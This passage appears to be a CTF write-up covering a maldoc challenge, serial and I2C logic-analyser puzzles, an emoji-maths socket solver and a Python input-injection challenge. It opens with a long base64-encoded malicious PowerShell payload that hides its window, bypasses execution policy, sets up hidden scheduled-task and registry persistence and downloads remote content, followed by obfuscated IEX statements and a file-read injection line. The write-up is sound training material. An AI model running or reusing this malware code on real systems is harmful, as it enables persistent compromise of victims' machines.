JhQUZFQVFnQTBBRUVBUXdCQkFFRUFTZ0JCQUVJQWF3QkJBRWNBUlFCQkFHUUFRUUJDQUdnQVFRQkRBRUVBUVFCTkFHY0FRUUFyQUVFQVF3QlpBRUVBVFFCUkFFRUFad0JCQUVnQWR3QkJBRWtBUVFCQ0FGQUFRUUJJQUZVQVFRQmtBRUVBUVFCMEFFRUFSZ0JOQUVFQVpBQkJBRUlBZVFCQkFFY0Fhd0JCQUdJQVp3QkNBRzRBUVFCREFFRUFRUUJMQUZFQVFRQTNBRUVBUXdCUkFFRUFZd0IzQUVJQWJBQkJBRWNBTkFCQkFGb0FRUUJDQUdrQVFRQkhBRVVBUVFCWkFIY0FRZ0J5QUVFQVJBQkpBRUVBU1FCQkFFRUFad0JCQUVRQU1BQkJBRWtBUVFCQkFHc0FRUUJJQUUwQVFRQmFBRkVBUWdCMUFFRUFSd0JSQUVFQVdRQm5BRUlBYUFCQkFFY0FUUUJCQUdFQWR3QkJBR2NBUVFCREFITUFRUUJKQUVFQVFRQnBBRUVBUmdCQkFFRUFWUUIzQUVFQVp3QkJBRU1BU1FCQkFFa0FRUUJCQUhJQVFRQkRBRUVBUVFCTEFFRUFRZ0IzQUVFQVNBQmpBRUVBV2dCQkFFRUFjQUJCQUVNQU5BQkJBRlVBUVFCQ0FHZ0FRUUJJQUZFQVFRQmhBRUVBUVFCbkFFRUFRd0J6QUVFQVNRQkJBRUVBYVFCQkFFUUFOQUJCQUVrQVFRQkJBR2tBUVFCRUFITUFRUUJLQUVFQVFnQjZBRUVBUndCVkFFRUFZZ0JuQUVJQWF3QkJBRWNBU1FCQkFHVUFVUUJDQURBQVFRQkhBRlVBUVFCSkFFRUFRUUE1QUVFQVF3QkJBRUVBU3dCQkFFSUFZZ0JCQUVnQVVRQkJBRm9BVVFCQ0FEUUFRUUJJQUZFQVFRQk1BR2NBUWdCc0FFRUFSd0EwQUVFQVdRQjNBRUlBZGdCQkFFY0FVUUJCQUdFQVVRQkNBSFVBUVFCSEFHTUFRUUJZQUZFQVFRQTJBRUVBUkFCdkFFRUFVUUJSQUVJQVZBQkJBRVVBVFFCQkFGTUFVUUJDQUVvQVFRQkRBR3NBUVFCTUFHY0FRZ0JJQUVFQVJ3QlZBRUVBWkFCQkFFSUFRd0JCQUVnQWF3QkJBR1FBUVFCQ0FHd0FRUUJJQUUwQVFRQkxBRUVBUVFCckFFRUFTQUJOQUVFQVdnQlJBRUlBZFFCQkFFY0FVUUJCQUZrQVp3QkNBR2dBUVFCSEFFMEFRUUJoQUhjQVFRQjVBRUVBUXdCckFFRUFUd0IzQUVFQWF3QkJBRWdBVFFCQkFHUUFRUUJDQUhrQVFRQkhBRlVBUVFCWkFGRUFRZ0IwQUVFQVF3QTBBRUVBVmdCM0FFSUFlUUJCQUVjQWF3QkJBR1FBUVFCQ0FHd0FRUUJEQUdjQVFRQktBRUVBUWdCNkFFRUFSd0JWQUVFQVlnQm5BRUlBYXdCQkFFY0FTUUJCQUdVQVVRQkNBREFBUVFCSEFGVUFRUUJNQUVFQVFRQjNBRUVBUXdCM0FFRUFTZ0JCQUVJQWVnQkJBRWNBVlFCQkFHSUFad0JDQUdzQVFRQkhBRWtBUVFCbEFGRUFRZ0F3QUVFQVJ3QlZBRUVBVEFCbkFFSUFUUUJCQUVjQVZRQkJBR0lBWndCQ0FHNEFRUUJJQUZFQVFRQmhBRUVBUVFCd0FFRUFSQUJ6QUVFQVNnQkJBRUlBZWdCQkFFZ0FVUUJCQUdNQVp3QkNBR3dBUVFCSEFFVUFRUUJpQUZFQVFRQjFBRUVBUlFCWkFFRUFZZ0JCQUVJQU1RQkJBRWdBVFFCQkFHRUFRUUJCQUc4QVFRQkRBR3NBUVFCbUFGRUFRUUEzQUVFQVF3QlJBRUVBV1FCM0FFSUFjd0JCQUVjQWF3QkJBRm9BVVFCQ0FIVUFRUUJJQUZFQVFRQk1BR2NBUWdCRUFFRUFSd0IzQUVFQVlnQjNBRUlBZWdCQkFFY0FWUUJCQUVzQVFRQkJBSEFBUVFCQkFEMEFQUUFpQURzQUNnQUtBQW9BVXdCRkFIUUFJQUFvQUNJQVJ3QTRBQ0lBS3dBaUFHZ0FJZ0FwQUNBQUlBQW9BQ0FBSUFBaUFDQUFLUUFnQUNrQU5nQXpBRjBBVWdCaEFHZ0FZd0JiQUN3QUp3QnlBR0VBV2dBbkFFVUFZd0JoQUd3QVVBQmxBRklBTFFBZ0FDQUFOQUF6QUYwQVVnQmhBR2dBWXdCYkFDd0FLUUF3QURVQVhRQlNBR0VBYUFCakFGc0FLd0E0QURjQVhRQlNBR0VBYUFCakFGc0FLd0E1QURRQVhRQlNBR0VBYUFCakFGc0FLQUFnQUNBQVpRQkRBRUVBYkFCd0FFVUFVZ0JqQUMwQUlBQWdBQ2tBSndBN0FESUFKd0FyQUNjQVRnQW5BQ3NBSndBeEFDY0FLd0FuQUgwQVlRQjBBR1VBYlFCZkFIY0FaUUFuQUNzQUp3QnVBRjhBWlFCb0FIUUFKd0FyQUNjQVh3QXlBRTRBTVFBZ0FEMEFJQUJ1QUNjQUt3QW5BR2NBWlFCeUFISUFKd0FyQUNjQVlRQmFBQ2NBS0FBb0FDQUFLQUFnQUNrQUp3QW5BRzRBYVFCUEFHb0FMUUFuQUhnQUp3QXJBRjBBTXdBc0FERUFXd0FwQUNnQVJ3Qk9BR2tBY2dCVUFGTUFid0IwQUM0QVJRQmpBRTRBWlFCeUFHVUFSZ0JsQUZJQWNBQkZBSE1BVHdCQ0FGSUFSUUIyQUNRQUlBQW9BQ0FBTGdBZ0FDSUFJQUFnQUNrQUlBQTdBQzBBYWdCUEFFa0FiZ0FnQUNnQUlBQnNBRk1BSUFBb0FDSUFWZ0JCQUZJQUlnQXJBQ0lBU1FCaEFFSUFJZ0FyQUNJQVRBQkZBRG9BWndBaUFDc0FJZ0E0QUVnQUlnQXBBQ0FBSUFBcEFDNEFWZ0JCQUV3QWRRQmxBRnNBSUFBdEFDQUFNUUF1QUM0QUlBQXRBQ0FBS0FBZ0FDZ0FJQUJzQUZNQUlBQW9BQ0lBVmdCQkFGSUFJZ0FyQUNJQVNRQmhBRUlBSWdBckFDSUFUQUJGQURvQVp3QWlBQ3NBSWdBNEFFZ0FJZ0FwQUNBQUlBQXBBQzRBVmdCQkFFd0FkUUJsQUM0QVRBQmxBRzRBWndCMEFFZ0FLUUJkQUNBQWZBQWdBRWtBWlFCWUFDQUFDZ0FLQUVFQVpBQmtBQzBBVkFCNUFIQUFaUUFnQUMwQVRnQmhBRzBBWlFBZ0FGY0FhUUJ1QUdRQWJ3QjNBQ0FBTFFCT0FHRUFiUUJsQUhNQWNBQmhBR01BWlFBZ0FFTUFid0J1QUhNQWJ3QnNBR1VBSUFBdEFFMEFaUUJ0QUdJQVpRQnlBRVFBWlFCbUFHa0FiZ0JwQUhRQWFRQnZBRzRBSUFBbkFBb0FXd0JFQUd3QWJBQkpBRzBBY0FCdkFISUFkQUFvQUNJQVN3QmxBSElBYmdCbEFHd0FNd0F5QUM0QVpBQnNBR3dBSWdBcEFGMEFDZ0J3QUhVQVlnQnNBR2tBWXdBZ0FITUFkQUJoQUhRQWFRQmpBQ0FBWlFCNEFIUUFaUUJ5QUc0QUlBQkpBRzRBZEFCUUFIUUFjZ0FnQUVjQVpRQjBBRU1BYndCdUFITUFid0JzQUdVQVZ3QnBBRzRBWkFCdkFIY0FLQUFwQURzQUNnQUtBRnNBUkFCc0FHd0FTUUJ0QUhBQWJ3QnlBSFFBS0FBaUFIVUFjd0JsQUhJQU13QXlBQzRBWkFCc0FHd0FJZ0FwQUYwQUNnQndBSFVBWWdCc0FHa0FZd0FnQUhNQWRBQmhBSFFBYVFCakFDQUFaUUI0QUhRQVpRQnlBRzRBSUFCaUFHOEFid0JzQUNBQVV3Qm9BRzhBZHdCWEFHa0FiZ0JrQUc4QWR3QW9BRWtBYmdCMEFGQUFkQUJ5QUNBQWFBQlhBRzRBWkFBc0FDQUFTUUJ1QUhRQU13QXlBQ0FBYmdCREFHMEFaQUJUQUdnQWJ3QjNBQ2tBT3dBS0FDY0FPd0FLQUZzQVF3QnZBRzRBY3dCdkFHd0FaUUF1QUZjQWFRQnVBR1FBYndCM0FGMEFPZ0E2QUZNQWFBQnZBSGNBVndCcEFHNEFaQUJ2QUhjQUtBQmJBRU1BYndCdUFITUFid0JzQUdVQUxnQlhBR2tBYmdCa0FHOEFkd0JkQURvQU9nQkhBR1VBZEFCREFHOEFiZ0J6QUc4QWJBQmxBRmNBYVFCdUFHUUFid0IzQUNnQUtRQXNBQ0FBTUFBcEFEc0FDZ0FLQUFvQWFRQm1BQ0FBS0FBa0FIQUFZUUI1QUd3QWJ3QmhBR1FBUWdCaEFITUFaUUEyQURRQUlBQXRBRzBBWVFCMEFHTUFhQUFnQUNJQWFBQjBBSFFBY0FBNkFId0FhQUIwQUhRQWNBQnpBRG9BSWdBcEFDQUFld0FLQUNBQUlBQWdBQ0FBSkFCd0FHRUFlUUJzQUc4QVlRQmtBRUlBWVFCekFHVUFOZ0EwQUNBQVBRQWdBQ2dBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FDSUFUZ0JsQUhRQUxnQlhBR1VBWWdCakFHd0FhUUJsQUc0QWRBQWlBQ2tBTGdCRUFHOEFkd0J1QUd3QWJ3QmhBR1FBVXdCMEFISUFhUUJ1QUdjQUtBQWtBSEFBWVFCNUFHd0Fid0JoQUdRQVFnQmhBSE1BWlFBMkFEUUFLUUE3QUFvQWZRQUtBQW9BSkFCcEFHNEFjd0IwQUdFQWJBQnNBR1VBWkFBZ0FEMEFJQUJIQUdVQWRBQXRBRWtBZEFCbEFHMEFVQUJ5QUc4QWNBQmxBSElBZEFCNUFDQUFMUUJRQUdFQWRBQm9BQ0FBSWdCSUFFc0FRd0JWQURvQVhBQlRBRzhBWmdCMEFIY0FZUUJ5QUdVQVhBQWtBQ2dBSkFCeUFHVUFad0J3QUNrQUlnQWdBQzBBVGdCaEFHMEFaUUFnQUNJQUpBQW9BQ1FBY2dCbEFHY0FiZ0FwQUNJQUlBQXRBR1VBWVFBZ0FGTUFhUUJzQUdVQWJnQjBBR3dBZVFCREFHOEFiZ0IwQUdrQWJnQjFBR1VBT3dBS0FBb0FDZ0JwQUdZQUlBQW9BQ1FBYVFCdUFITUFkQUJoQUd3QWJBQmxBR1FBS1FBZ0FIc0FDZ0FLQUFvQUlBQWdBQ0FBSUFCcEFHWUFJQUFvQUNRQWFRQnVBSE1BZEFCaEFHd0FiQUJsQUdRQUlBQXRBRzRBWlFBZ0FDUUFjQUJoQUhrQWJBQnZBR0VBWkFCQ0FHRUFjd0JsQURZQU5BQXBBQ0FBZXdBS0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFCVEFHVUFkQUF0QUVrQWRBQmxBRzBBVUFCeUFHOEFjQUJsQUhJQWRBQjVBQ0FBTFFCUUFHRUFkQUJvQUNBQUlnQklBRXNBUXdCVkFEb0FYQUJUQUc4QVpnQjBBSGNBWVFCeUFHVUFYQUFrQUNnQUpBQnlBR1VBWndCd0FDa0FJZ0FnQUMwQVRnQmhBRzBBWlFBZ0FDSUFKQUFvQUNRQWNnQmxBR2NBYmdBcEFDSUFJQUF0QUVZQWJ3QnlBR01BWlFBZ0FDMEFWZ0JoQUd3QWRRQmxBQ0FBSkFCd0FHRUFlUUJzQUc4QVlRQmtBRUlBWVFCekFHVUFOZ0EwQURzQUNnQWdBQ0FBSUFBZ0FIMEFDZ0FLQUNNQUlBQnBBRzRBY3dCMEFHRUFiQUJzQUdFQWRBQnBBRzhBYmdBS0FIMEFJQUJsQUd3QWN3QmxBQ0FBZXdBS0FDQUFJQUFnQUNBQUNnQUtBQ0FBSUFBZ0FDQUFhUUJtQUNBQUtBQWtBRVlBUVFCTUFGTUFSUUFnQUMwQVpRQnhBQ0FBS0FCVUFHVUFjd0IwQUMwQVVBQmhBSFFBYUFBZ0FDMEFVQUJoQUhRQWFBQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QUpBQW9BQ1FBY2dCbEFHY0FjQUFwQUZ3QUlnQXBBQ2tBSUFCN0FBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FFNEFaUUIzQUMwQVNRQjBBR1VBYlFBZ0FDMEFVQUJoQUhRQWFBQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QUpBQW9BQ1FBY2dCbEFHY0FjQUFwQUNJQU93QUtBQ0FBSUFBZ0FDQUFmUUFLQUNBQUlBQWdBQ0FBVXdCbEFIUUFMUUJKQUhRQVpRQnRBRkFBY2dCdkFIQUFaUUJ5QUhRQWVRQWdBQzBBVUFCaEFIUUFhQUFnQUNJQVNBQkxBRU1BVlFBNkFGd0FVd0J2QUdZQWRBQjNBR0VBY2dCbEFGd0FKQUFvQUNRQWNnQmxBR2NBY0FBcEFDSUFJQUF0QUU0QVlRQnRBR1VBSUFBaUFDUUFLQUFrQUhJQVpRQm5BRzRBS1FBaUFDQUFMUUJHQUc4QWNnQmpBR1VBSUFBdEFGWUFZUUJzQUhVQVpRQWdBQ1FBY0FCaEFIa0FiQUJ2QUdFQVpBQkNBR0VBY3dCbEFEWUFOQUE3QUFvQUlBQWdBQ0FBSUFBS0FDQUFJQUFnQUNBQUNnQWdBQ0FBSUFBZ0FDUUFkUUFnQUQwQUlBQmJBRVVBYmdCMkFHa0FjZ0J2QUc0QWJRQmxBRzRBZEFCZEFEb0FPZ0JWQUhNQVpRQnlBRTRBWVFCdEFHVUFPd0FLQUNBQUlBQWdBQ0FBQ2dBZ0FDQUFJQUFnQUFvQUlBQWdBQ0FBSUFBa0FIUUFZUUJ6QUdzQUlBQTlBQ0FBUndCbEFIUUFMUUJUQUdNQWFBQmxBR1FBZFFCc0FHVUFaQUJVQUdFQWN3QnJBQ0FBTFFCVUFHRUFjd0JyQUU0QVlRQnRBR1VBSUFBaUFDUUFLQUFrQUhJQVpRQm5BSEFBS1FBa0FDZ0FKQUJ5QUdVQVp3QnVBQ2tBSWdBZ0FDMEFaUUJoQUNBQVV3QnBBR3dBWlFCdUFIUUFiQUI1QUVNQWJ3QnVBSFFBYVFCdUFIVUFaUUE3QUFvQUlBQWdBQ0FBSUFCcEFHWUFJQUFvQUNRQWRBQmhBSE1BYXdBcEFDQUFld0FLQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUJWQUc0QWNnQmxBR2NBYVFCekFIUUFaUUJ5QUMwQVV3QmpBR2dBWlFCa0FIVUFiQUJsQUdRQVZBQmhBSE1BYXdBZ0FDMEFWQUJoQUhNQWF3Qk9BR0VBYlFCbEFDQUFJZ0FrQUNnQUpBQnlBR1VBWndCd0FDa0FKQUFvQUNRQWNnQmxBR2NBYmdBcEFDSUFJQUF0QUVNQWJ3QnVBR1lBYVFCeUFHMEFPZ0FrQUdZQVlRQnNBSE1BWlFBN0FBb0FJQUFnQUNBQUlBQjlBQW9BSUFBZ0FDQUFJQUFLQUNBQUlBQWdBQ0FBQ2dBZ0FDQUFJQUFnQUNRQVlRQWdBRDBBSUFCT0FHVUFkd0F0QUZNQVl3Qm9BR1VBWkFCMUFHd0FaUUJrQUZRQVlRQnpBR3NBUVFCakFIUUFhUUJ2QUc0QUlBQXRBRVVBZUFCbEFHTUFkUUIwQUdVQUlBQWlBSEFBYndCM0FHVUFjZ0J6QUdnQVpRQnNBR3dBTGdCbEFIZ0FaUUFpQUNBQUlnQXRBSGNBSUFCb0FHa0FaQUJrQUdVQWJnQWdBQzBBUlFCNEFHVUFZd0IxQUhRQWFRQnZBRzRBVUFCdkFHd0FhUUJqQUhrQUlBQkNBSGtBY0FCaEFITUFjd0FnQUMwQWJnQnZBSEFBSUFBdEFFNEFid0JGQUhnQWFRQjBBQ0FBTFFCREFDQUFWd0J5QUdrQWRBQmxBQzBBYUFCdkFITUFkQUFnQUNjQVZ3QnBBRzRBWkFCdkFIY0Fjd0FnQUhVQWNBQmtBR0VBZEFCbEFDQUFjZ0JsQUdFQVpBQjVBQ2NBT3dBZ0FHa0FaUUI0QUNBQUtBQmJBRk1BZVFCekFIUUFaUUJ0QUM0QVZBQmxBSGdBZEFBdUFFVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JWQUZRQVJnQTRBQzRBUndCbEFIUUFVd0IwQUhJQWFRQnVBR2NBS0FCYkFGTUFlUUJ6QUhRQVpRQnRBQzRBUXdCdkFHNEFkZ0JsQUhJQWRBQmRBRG9BT2dCR0FISUFid0J0QUVJQVlRQnpBR1VBTmdBMEFGTUFkQUJ5QUdrQWJnQm5BQ2dBS0FCSEFHVUFkQUF0QUVrQWRBQmxBRzBBVUFCeUFHOEFjQUJsQUhJQWRBQjVBQ0FBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QUpBQW9BQ1FBY2dCbEFHY0FjQUFwQUNrQUxnQWtBQ2dBSkFCeUFHVUFad0J1QUNrQUtRQXBBQ2tBT3dBaUFEc0FDZ0FnQUNBQUlBQWdBQ1FBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRk1BWXdCb0FHVUFaQUIxQUd3QVpRQmtBRlFBWVFCekFHc0FWQUJ5QUdrQVp3Qm5BR1VBY2dBZ0FDMEFRUUIwQUV3QWJ3Qm5BRThBYmdBZ0FDMEFWUUJ6QUdVQWNnQWdBQ0lBSkFBb0FDUUFkUUFwQUNJQU93QUtBQ0FBSUFBZ0FDQUFKQUJ3QUNBQVBRQWdBRTRBWlFCM0FDMEFVd0JqQUdnQVpRQmtBSFVBYkFCbEFHUUFWQUJoQUhNQWF3QlFBSElBYVFCdUFHTUFhUUJ3QUdFQWJBQWdBQ0lBSkFBb0FDUUFkUUFwQUNJQU93QUtBQ0FBSUFBZ0FDQUFKQUJ6QUNBQVBRQWdBRTRBWlFCM0FDMEFVd0JqQUdnQVpRQmtBSFVBYkFCbEFHUUFWQUJoQUhNQWF3QlRBR1VBZEFCMEFHa0FiZ0JuQUhNQVV3QmxBSFFBSUFBdEFFZ0FhUUJrQUdRQVpRQnVBRHNBQ2dBZ0FDQUFJQUFnQUNRQVpBQWdBRDBBSUFCT0FHVUFkd0F0QUZNQVl3Qm9BR1VBWkFCMUFHd0FaUUJrQUZRQVlRQnpBR3NBSUFBdEFFRUFZd0IwQUdrQWJ3QnVBQ0FBSkFCaEFDQUFMUUJVQUhJQWFRQm5BR2NBWlFCeUFDQUFKQUIwQUNBQUxRQlFBSElBYVFCdUFHTUFhUUJ3QUdFQWJBQWdBQ1FBY0FBZ0FDMEFVd0JsQUhRQWRBQnBBRzRBWndCekFDQUFKQUJ6QURzQUNnQWdBQ0FBSUFBZ0FGSUFaUUJuQUdrQWN3QjBBR1VBY2dBdEFGTUFZd0JvQUdVQVpBQjFBR3dBWlFCa0FGUUFZUUJ6QUdzQUlBQWlBQ1FBS0FBa0FISUFaUUJuQUhBQUtRQWtBQ2dBSkFCeUFHVUFad0J1QUNrQUlnQWdBQzBBU1FCdUFIQUFkUUIwQUU4QVlnQnFBR1VBWXdCMEFDQUFKQUJrQURzQUNnQjlBQW9BQ2dBS0FHa0FaUUI0QUNBQUtBQmJBRk1BZVFCekFIUUFaUUJ0QUM0QVZBQmxBSGdBZEFBdUFFVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JWQUZRQVJnQTRBQzRBUndCbEFIUUFVd0IwQUhJQWFRQnVBR2NBS0FCYkFGTUFlUUJ6QUhRQVpRQnRBQzRBUXdCdkFHNEFkZ0JsQUhJQWRBQmRBRG9BT2dCR0FISUFid0J0QUVJQVlRQnpBR1VBTmdBMEFGTUFkQUJ5QUdrQWJnQm5BQ2dBSkFCd0FHRUFlUUJzQUc4QVlRQmtBRUlBWVFCekFHVUFOZ0EwQUNrQUtRQXBBRHNBQ2dBS0FBPT0K). In between all of the nastiness, the two (formatted) statements of interest were.

```powershell
. 
( $PshomE[4]+$pshoMe[30]+'x') ( 
    [strinG]::join(
        '' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft'
    ) | FoREaCH-OBJecT {$_.VALUE} )) 
)
```

```powershell
SEt ("G8"+"h")  (  
    " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  
    );
-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX
```

I booted a Windows VM to try and deobfuscate the statements a little. The first one I reduced to the following and ran in a PowerShell session:

```powershell
[strinG]::join(
        '' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft'
    ) | FoREaCH-OBJecT {$_.VALUE} ))
```

{{< figure src="/images/htbcyperapocalypse21/invitation_1.png" >}}

That resulted in:

```powershell
('iqwreg'+'p ='+' jXtCH'+'T'+'B{'+'maldocs_arej'+'Xt;').REPLACe('iqw','$').REPLACe('jXt',[sTRInG][chAR]34) |&( $sheLLiD[1]+$sHeLlID[13]+'x')
```

If you look closely, you should spot a part of the flag as `CHTB{maldocs_are`. Notice the calls to `replace()` which make it more obvious. The second interesting statement I mentioned, you should see a part of the flag that is reversed: `'}atem_we'+'n_eht'+'`. Reverse by hand and put them together to get the flag.

Flag: `CHTB{maldocs_are_the_new_meta}`

## category - Hardware

### - Serial Logs

- Category: Hardware
- Difficulty: 1/4
- Files: .sal file

After figuring out what a .sal file was, I downloaded the Windows Logic Analyzer software from Saleae [here](https://www.saleae.com/downloads/). Open up the .sal file and you'd see a waveform of sorts. It took a bit of time to figure out how to use Logic2 application, but eventually I got to the point where I added a Async Serial Analyzer and chose 115200 as the bit rate (a guess).

{{< figure src="/images/htbcyperapocalypse21/serial_logs_1.png" >}}

In the terminal view you could see some clear text "logs", with the last readable entry saying that the baud rate has changed, followed by gibberish.

{{< figure src="/images/htbcyperapocalypse21/serial_logs_2.png" >}}

With a clear hint that the baud rate changed, the next step was to figure out what the new baud rate was. Looking at the waveform zoomed out pretty far you could see the collapsed pulses being visually different together with the ASCII representation of the bytes Logic2 shows.

{{< figure src="/images/htbcyperapocalypse21/serial_logs_3.png" >}}

Calculating baud is something I have struggled with before in [previous work](https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/). This time though I came across a really good post helping clear up some of the math [here](https://electronics.stackexchange.com/questions/273816/how-to-calculate-baud-rate-and-determine-the-number-of-stop-bits-in-asynchronous). The TL;DR is that the formula to use to calculate the baud rate is `1/(smallest 1/0 time) / 10e-6`. If we look at the waveform at two different times, one where the known baud is 115200 and another time where the new baud is used, you can see the pulse timing being clearly different.

115200 baud

{{< figure src="/images/htbcyperapocalypse21/serial_logs_4.png" >}}

Unknown baud

{{< figure src="/images/htbcyperapocalypse21/serial_logs_5.png" >}}

To test the formula, I tried to see if I can get to 115200. The shortest pulse I could find was 8.48us.

```text
>>> 1/(8.48*10e-6)
11792.452830188677
```

With 115200 being expected, but getting 11792, there was definitely something off. Multiplying by `10e-7` would move the decimal up one place giving is at least a closer hit, but it was not 115200. I changed the existing Async Serial analyser to 117924 to see if that would work, and to my surprise, it did. Heh! So it sort of works out :P

That meant I could soft of work out the new baud rate.

```text
>>> 1/(13.46*10e-7)
74294.20505200594
```

Updating the Async Serial analyser with a new baud rate of 74294, we see the terminal now showing the original log entries we could see as gibberish, but the new ones in printable ASCII revealing the flag.

{{< figure src="/images/htbcyperapocalypse21/serial_logs_6.png" >}}

Flag: `CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}`

### - Compromised

- Category: Hardware
- Difficulty: 1/4
- Files: .sal file

Another sal file, this time with data in two channels. I looked for analysers that accepted two channels and found the I2C analyser.

{{< figure src="/images/htbcyperapocalypse21/compromised_1.png" >}}

The resultant data table showed many ASCII printable characters, so I figured I at least had the right analyser chosen. I exported the data to the clipboard and pasted it into a text file for further processing.

{{< figure src="/images/htbcyperapocalypse21/compromised_2.png" >}}

A closer look showed that the data had a start/stop sequence, writing one byte at a time. You also could see this when you zoomed the analysed wave form.

{{< figure src="/images/htbcyperapocalypse21/compromised_3.png" >}}

{{< figure src="/images/htbcyperapocalypse21/compromised_4.png" >}}

The raw data also had an address instruction, which was either `4` or `,`. Knowing the flag format, we could see that when the `,` address is used, valid characters are written. A simple grep on that extracted data where the `,` address is used reveals the flag.

{{< figure src="/images/htbcyperapocalypse21/compromised_5.png" >}}

Flag: `CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}`

## category - Misc

### - Alien Camp

- Category: Misc
- Difficulty: 1/4
- Files: None

A socket service hosted a calculator game, driven by emojis. Sending 1 would send an emoji value reference that changed every time you connected to the socket service. Using this reference, you had to solve 500 math questions in less than 2 seconds or something, each. Obviously something we have to script!

{{< figure src="/images/htbcyperapocalypse21/alien_camp_1.png" >}}

My script has two parts. First, request the value map, parse and save that. Next, start the game, parse the question by replacing the emojis with the parsed integers and then `eval()` that.

```python
from pwn import *

ev = [] # emoji value store

def find_val(e):
    """ get the int value for an emoji """
    for emoji, value in ev:
        if e == emoji:
            return value

def calc(q, num):
    """ answer a question """
    qs = [x.decode('utf-8') for x in q.split(b'\x20')]

    # example variable length questions
    # ['🌞', '*', '🍨', '+', '👺', '+', '👺', '+', '🍧', '*', '⛔', '*', '❌', '', '=', '?\n']
    # ['🍪', '*', '🦄', '-', '🌞', '-', '⛔', '-', '🍪', '+', '🦄', '', '=', '?\n']
    # ['🌞', '*', '🔥', '-', '🦄', '+', '🌞', '-', '👺', '', '=', '?\n']
    # ['❌', '-', '🍪', '*', '🍨', '-', '🦄', '*', '❌', '', '=', '?\n']
    # ['🍪', '-', '🔥', '+', '👺', '', '=', '?\n']

    m = ''

    for x in qs:
        if x == '':
            break

        if x in ['+', '-', '*',]:
            m = f'{m} {x}'
            continue

        m = f'{m} {find_val(x)}'
    
    ans = eval(m) # this_is_fine.exe
    print(f'# {num}, q {qs}, a {ans}')

    return ans

def get_q(c):
    """ get a question """
    c.recvline()
    c.recvline()

    _, q_num = c.recvline().split(b'\x20')

    q_num, _ = q_num.decode('utf-8').split(':')
    c.recvline()
    q = c.recvline()
    c.recvuntil('Answer: ')

    return int(q_num), q


if __name__ == '__main__':

    conn = remote('138.68.185.219', 31021)
    conn.recvuntil('>')

    conn.send('1\n')
    conn.recvline()
    conn.recvline()
    key = conn.recvline() 
    conn.recvline()

    # populate the emoji value store
    keys = key.split(b'\x20')
    conn.recvuntil('>')
    c = 0
    while len(ev) < 10:
        ev.append((keys[c].decode('utf-8'), int(keys[c+2]),))
        c+=3

    # start game
    conn.send('2\n')
    conn.recvline()

    q_num = 0
    while q_num < 500:
        q_num, q = get_q(conn)
        a = calc(q, q_num)

        conn.send(f'{a}\n')
        conn.recvline()

    # get our flag
    conn.interactive()
```

The final moments of the script running looked like this.

{{< figure src="/images/htbcyperapocalypse21/alien_camp_2.png" >}}

Flag: `CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}`

### - Input as a Service

- Category: Misc
- Difficulty: 1/4
- Files: None

We get another socket service, but I wasted a bunch of time by browsing to it... lol.

{{< figure src="/images/htbcyperapocalypse21/input_as_a_service_1.png" >}}

Anyways, rabbit hole aside, it looked like some sort of python interpreter over a TCP socket. Maybe not exactly a python interpreter, but you could do some interesting things like read files.

{{< figure src="/images/htbcyperapocalypse21/input_as_a_service_2.png" >}}

To get the flag. just `open('flag.txt').read()`.

Flag: `CHTB{4li3n5_us3_pyth0n2.X?!`
